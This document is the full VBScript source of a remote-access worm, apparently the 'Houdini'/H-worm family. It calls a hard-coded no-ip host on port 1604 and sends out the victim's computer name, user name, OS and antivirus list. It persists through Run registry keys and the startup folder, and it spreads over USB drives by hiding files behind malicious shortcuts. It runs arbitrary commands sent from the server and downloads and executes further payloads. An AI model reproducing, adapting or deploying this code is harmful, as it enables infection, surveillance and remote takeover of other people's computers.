'=-=-=-=-= config =-=-=-=-=-=-=-=-=-=-=-=-=-=

host = "hamdid07.no-ip.info"
port = 1604
installdir = "w-dir"

'<[ coded by nj ]> | <[ modifier : houdini ]>

'=-=-=-=-= public var =-=-=-=-=-=-=-=-=-=-=-=

dim shellobj 
set shellobj = wscript.createobject("wscript.shell")
dim filesystemobj
set filesystemobj = createobject("scripting.filesystemobject")
dim httpobj
set httpobj = createobject("msxml2.xmlhttp")


'=-=-=-=-= privat var =-=-=-=-=-=-=-=-=-=-=-=

installname = wscript.scriptname
startup = shellobj.specialfolders ("startup") & "\"
installdir = shellobj.expandenvironmentstrings(installdir) & "\"
if not filesystemobj.folderexists(installdir) then  installdir = shellobj.expandenvironmentstrings("%temp%") & "\"
spliter = "<|>"
sleep = 5000 
dim response
dim cmd
dim param
info = ""
usbspreading = ""
dim oneonce

'=-=-=-=-= code start =-=-=-=-=-=-=-=-=-=-=-=
on error resume next


instance
while true

install

response = ""
response = post ("is-ready","")
cmd = split (response,spliter)
select case cmd (0)
case "excecute"
      param = cmd (1)
      execute param
case "update"
      param = cmd (1)
      oneonce.close
      set oneonce =  filesystemobj.opentextfile (installdir & installname ,2, false)
      oneonce.write param
      oneonce.close
      shellobj.run "wscript.exe //B " & chr(34) & installdir & installname & Chr(34)
      wscript.quit 
case "uninstall"
      uninstall
Case "send"
      param = cmd (1)
      download (param)
end select

wscript.sleep sleep

wend


sub install
on error resume next
dim lnkobj
dim filename
dim fileicon

upstart
for each drive in filesystemobj.drives

if  drive.isready = true then
if  drive.freespace  > 0 then
if  drive.drivetype  = 1 then
    filesystemobj.copyfile wscript.scriptfullname , drive.path & "\" & installname,true
    if  filesystemobj.fileexists (drive.path & "\" & installname)  then
        filesystemobj.getfile(drive.path & "\"  & installname).attributes = 2+4
    end if
    for each file in filesystemobj.getfolder( drive.path & "\" ).files
        if  instr (file.name,".") then
            if  lcase (split(file.name, ".") (ubound(split(file.name, ".")))) <> "lnk" then
                file.attributes = 2+4
                if  ucase (file.name) <> ucase (installname) then
                    filename = split(file.name,".")
                    set lnkobj = shellobj.createshortcut (drive.path & "\"  & filename (0) & ".lnk") 
                    lnkobj.targetpath = "cmd.exe"
                    lnkobj.workingdirectory = ""
                    lnkobj.arguments = "/c start " & replace(installname," ", chrw(34) & " " & chrw(34)) & "&start " & replace(file.name," ", chrw(34) & " " & chrw(34)) &"&exit"
                    fileicon = shellobj.regread ("HKEY_LOCAL_MACHINE\software\classes\" & shellobj.regread ("HKEY_LOCAL_MACHINE\software\classes\." & split(file.name, ".")(ubound(split(file.name, ".")))& "\") & "\defaulticon\") 
                    if  instr (fileicon,",") = 0 then
                        lnkobj.iconlocation = file.path
                    else 
                        lnkobj.iconlocation = fileicon
                    end if
                    lnkobj.save()
                end if
            end if
        end if
    next
end If
end If
end if
next
err.clear
end sub

sub uninstall
on error resume next
dim filename

shellobj.regdelete "HKEY_CURRENT_USER\software\microsoft\windows\currentversion\run\" & split (installname,".")(0)
shellobj.regdelete "HKEY_LOCAL_MACHINE\software\microsoft\windows\currentversion\run\" & split (installname,".")(0)
filesystemobj.deletefile startup & installname ,true
filesystemobj.deletefile wscript.scriptfullname ,true

for  each drive in filesystemobj.drives
if  drive.isready = true then
if  drive.freespace  > 0 then
if  drive.drivetype  = 1 then
    for  each file in filesystemobj.getfolder ( drive.path & "\").files
         on error resume next
         if  instr (file.name,".") then
             if  lcase (split(file.name, ".")(ubound(split(file.name, ".")))) <> "lnk" then
                 file.attributes = 0
                 if  ucase (file.name) <> ucase (installname) then
                     filename = split(file.name,".")
                     filesystemobj.deletefile (drive.path & "\" & filename(0) & ".lnk" )
                 else
                     filesystemobj.deletefile (drive.path & "\" & file.name)
                 end if
             end if
         end if
     next
end if
end if
end if
next
wscript.quit
end sub

function post (cmd ,param)

post = param
httpobj.open "post","http://" & host & ":" & port &"/" & cmd, false
httpobj.setrequestheader "user-agent:",information
httpobj.send param
post = httpobj.responsetext
end function

function information
on error resume next
if  inf = "" then
    inf = hwid & spliter 
    inf = inf  & shellobj.expandenvironmentstrings("%computername%") & spliter 
    inf = inf  & shellobj.expandenvironmentstrings("%username%") & spliter

    set root = getobject("winmgmts:{impersonationlevel=impersonate}!\\.\root\cimv2")
    set os = root.execquery ("select * from win32_operatingsystem")
    for each osinfo in os
       inf = inf & osinfo.caption & spliter  
       exit for
    next
    inf = inf & "underworld final" & spliter
    inf = inf & security & spliter
    inf = inf & usbspreading
    information = inf  
else
    information = inf
end if
end function


sub upstart ()
on error resume Next

shellobj.regwrite "HKEY_CURRENT_USER\software\microsoft\windows\currentversion\run\" & split (installname,".")(0),  "wscript.exe //B " & chrw(34) & installdir & installname & chrw(34) , "REG_SZ"
shellobj.regwrite "HKEY_LOCAL_MACHINE\software\microsoft\windows\currentversion\run\" & split (installname,".")(0),  "wscript.exe //B "  & chrw(34) & installdir & installname & chrw(34) , "REG_SZ"
filesystemobj.copyfile wscript.scriptfullname,installdir & installname,true
filesystemobj.copyfile wscript.scriptfullname,startup & installname ,true

end sub


function hwid
on error resume next

set root = getobject("winmgmts:{impersonationlevel=impersonate}!\\.\root\cimv2")
set disks = root.execquery ("select * from win32_logicaldisk")
for each disk in disks
    if  disk.volumeserialnumber <> "" then
        hwid = disk.volumeserialnumber
        exit for
    end if
next
end function


function security 
on error resume next

security = ""

set objwmiservice = getobject("winmgmts:{impersonationlevel=impersonate}!\\.\root\cimv2")
set colitems = objwmiservice.execquery("select * from win32_operatingsystem",,48)
for each objitem in colitems
	versionstr = split (objitem.version,".")
next
versionstr = split (colitems.version,".")
osversion = versionstr (0) & "."
for  x = 1 to ubound (versionstr)
	 osversion = osversion &  versionstr (i)
next
osversion = eval (osversion)
if  osversion > 6 then sc = "securitycenter2" else sc = "securitycenter"

set objsecuritycenter = getobject("winmgmts:\\localhost\root\" & sc)
Set colantivirus = objsecuritycenter.execquery("select * from antivirusproduct","wql",0)

for each objantivirus in colantivirus
    security  = security  & objantivirus.displayname & " ."
next
if security  = "" then security  = "nan-av"
end function


function instance
on error resume next

usbspreading = shellobj.regread ("HKEY_LOCAL_MACHINE\software\" & split (installname,".")(0) & "\")
if usbspreading = "" then
   if lcase ( mid(wscript.scriptfullname,2)) = ":\" &  lcase(installname) then
      usbspreading = "true"
      shellobj.regwrite "HKEY_LOCAL_MACHINE\software\" & split (installname,".")(0)  & "\",  usbspreading, "REG_SZ"
   else
      usbspreading = "false"
      shellobj.regwrite "HKEY_LOCAL_MACHINE\software\" & split (installname,".")(0)  & "\",  usbspreading, "REG_SZ"

   end if
end if

upstart
set scriptfullnameshort =  filesystemobj.getfile (wscript.scriptfullname)
set installfullnameshort =  filesystemobj.getfile (installdir & installname)
if  lcase (scriptfullnameshort.shortpath) <> lcase (installfullnameshort.shortpath) then 
    shellobj.run "wscript.exe //B " & chr(34) & installdir & installname & Chr(34)
    wscript.quit 
end If
err.clear
set oneonce = filesystemobj.opentextfile (installdir & installname ,8, false)
if  err.number > 0 then wscript.quit
end function


function download (fileurl)


strsaveto = installdir & mid (fileurl, instrrev (fileurl,"\") + 1)
set objhttpdownload = createobject("msxml2.xmlhttp")
objhttpdownload.open "post","http://" & host & ":" & port &"/" & "is-sending" & spliter & fileurl, false
objhttpdownload.send ""
     
set objfsodownload = createobject ("scripting.filesystemobject")
if  objfsodownload.fileexists (strsaveto) then
    objfsodownload.deletefile (strsaveto)
end if
if  objhttpdownload.status = 200 then
    dim  objstreamdownload
	set  objstreamdownload = createobject("adodb.stream")
    with objstreamdownload 
		 .type = 1 
		 .open
		 .write objhttpdownload.responsebody
		 .savetofile strsaveto
		 .close
	end with
    set objstreamdownload  = nothing
end if
if  objfsodownload.fileexists (strsaveto) then	  	
    shellobj.run strsaveto
end if 
end function
